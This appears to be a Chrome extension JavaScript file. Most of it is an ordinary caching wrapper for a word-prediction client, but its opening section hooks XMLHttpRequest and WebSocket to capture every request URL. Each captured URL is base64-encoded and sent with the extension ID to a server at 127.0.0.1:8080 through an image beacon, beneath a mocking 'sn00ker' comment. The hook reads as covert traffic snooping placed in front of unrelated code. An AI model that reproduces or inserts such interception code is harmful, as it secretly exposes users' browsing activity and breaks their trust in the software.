function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var PredictionCachedClient = function (client) {
    let cache = {
        version: null,
        descriptionLoaded: false,
        GetTopicDictionaries: {},
    }

    return {
        setViaProxy: function (payload, lol, success, error) {
            client.setViaProxy(payload, lol, success, error);
        },
        version: function (payload, lol, success, error) {
            let cachedResult = cache.version;
            
            cachedResult ? success(cachedResult) : client.version(payload, lol, function (result) {
                cache.version = Object.assign({}, result);
                success(result);
            }, error);
        },
        loadDescription: function (payload, success, error) {
            let cachedResult = cache.descriptionLoaded;
            success = success ? success : () => {};

            cachedResult ? success() : client.loadDescription(payload, function () {
                cache.descriptionLoaded = true;
                success();
            }, error);
        },
        GetListOfWords2: function (payload, lol, success, error) {
            client.GetListOfWords2(payload, lol, success, error);
        },
        GetTopicDictionaries: function (payload, lol, success, error) {
            let key = CryptoJS.MD5(payload.session_id + "-" + payload.application);
            let cachedResult = cache.GetTopicDictionaries[key];
            
            cachedResult ? success(cachedResult) : client.GetTopicDictionaries(payload, lol, function (result) {
                cache.GetTopicDictionaries[key] = Object.assign({}, result);
                success(result);
            }, error);
        },
        dump: function () {
            console.log(cache);
        }
    };
}
